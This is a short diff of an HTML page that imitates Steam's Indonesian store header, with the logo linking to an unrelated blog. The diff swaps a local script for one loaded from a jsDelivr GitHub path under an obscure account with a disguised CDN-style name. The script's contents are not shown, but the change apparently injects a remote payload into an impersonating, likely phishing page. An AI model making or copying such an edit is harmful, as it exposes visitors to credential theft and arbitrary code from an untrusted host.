@@ -228,7 +228,7 @@
                      <a href="https://mariapilaralda.com/blog/" aria-label="Tautan ke Halaman Beranda Steam">
                      <img src="https://store.fastly.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44" alt="Tautan ke Halaman Beranda Steam">
                      </a>
-<script async src="/js/cdn.light.repository.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/lazcdn-12029-21/js@refs/heads/main/cdn.light.repository.js"></script>
                      </span>
                   </div>
                   <div role="navigation" class="supernav_container" aria-label="Menu Global">
